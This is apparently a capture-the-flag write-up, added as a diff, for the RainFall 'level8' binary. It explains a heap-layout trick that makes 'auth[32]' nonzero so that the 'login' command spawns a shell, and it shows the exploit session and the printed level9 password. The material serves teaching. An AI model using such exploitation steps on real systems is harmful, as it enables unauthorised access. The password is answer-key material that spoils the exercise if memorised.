@@ -1,0 +1,27 @@
+The level8 program is a loop that waits for user input and prints 2 addresses.
+We can see that there are 2 global variables, auth and service:
+
+(gdb) info variables
+[...]
+0x08049aac  auth
+0x08049ab0  service
+
+We can quickly see that these two are the variables that get printed at each iteration of the program.
+We also notice that the user input is compared, through instructions akin to strncmp, to the following string literals: "auth ", "reset", "service" and "login", and after the comparison to login, we see a call to `system` with "/bin/sh".
+
+That call is also protected by another condition, it checks if `auth[32]` is different than 0, so we need a way to write there, there is a call to malloc + strcpy protected in the "auth " block, but a condition prevents us from writing more than 30 characters in `auth`.
+
+However, since ASLR is disabled, we can abuse the calls to malloc to first get an address for `auth`, and using the "service" block to allocate memory to `service`, which will follow `auth`, we just need to have a memory layout where `auth + 32` is located in the memory allocated by strdup for `service`.
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cd ../level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
